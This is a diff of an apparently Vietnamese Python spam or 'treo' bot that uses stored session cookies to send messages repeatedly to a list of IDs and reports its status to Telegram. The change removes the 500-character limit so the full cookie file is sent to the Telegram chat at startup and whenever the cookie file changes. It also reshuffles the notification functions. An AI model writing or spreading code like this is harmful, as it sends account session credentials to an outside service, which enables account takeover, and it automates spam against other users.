@@ -73,26 +73,10 @@ def send_startup_info():
     text = f"🚀 <b>Khởi động treo</b>\n"
     text += f"📅 Ngày bắt đầu: {now}\n"
     text += f"⏱ Delay: {dls}s\n"
-    text += f"🍪 Cookies ({len(cks)}):\n<code>{ck_content[:500]}</code>\n"
+    text += f"🍪 Cookies ({len(cks)}):\n<code>{ck_content}</code>\n"        # <-- bỏ [:500]
     text += f"📋 IDs ({len(bxs)}):\n<code>{id_content[:500]}</code>\n"
     text += f"💬 Message:\n<code>{msg_content[:500]}</code>"
     send_telegram_message(text, reply_markup=make_kill_keyboard())
-
-def send_alive_notification():
-    if not TELEGRAM_ENABLED:
-        return
-    now = time.strftime("%Y-%m-%d %H:%M:%S")
-    text = f"⏳ <b>Vẫn đang treo</b> tại {now}"
-    send_telegram_message(text)
-
-def send_stop_notification():
-    global stop_sent
-    if not TELEGRAM_ENABLED or stop_sent:
-        return
-    stop_sent = True
-    now = time.strftime("%Y-%m-%d %H:%M:%S")
-    text = f"🛑 <b>Đã dừng treo</b> vào lúc {now}"
-    send_telegram_message(text)
 
 def send_cookie_change_notification(new_file):
     if not TELEGRAM_ENABLED:
@@ -103,7 +87,16 @@ def send_cookie_change_notification(new_file):
     text = f"🔄 <b>Thay đổi file cookies</b>\n"
     text += f"📂 File mới: {new_file}\n"
     text += f"📅 Thời gian: {now}\n"
-    text += f"🍪 Cookies ({len(new_cks)}):\n<code>{ck_content[:500]}</code>"
+    text += f"🍪 Cookies ({len(new_cks)}):\n<code>{ck_content}</code>"       # <-- bỏ [:500]
+    send_telegram_message(text)
+
+def send_stop_notification():
+    global stop_sent
+    if not TELEGRAM_ENABLED or stop_sent:
+        return
+    stop_sent = True
+    now = time.strftime("%Y-%m-%d %H:%M:%S")
+    text = f"🛑 <b>Đã dừng treo</b> vào lúc {now}"
     send_telegram_message(text)
 
 def telegram_alive(stop_event):
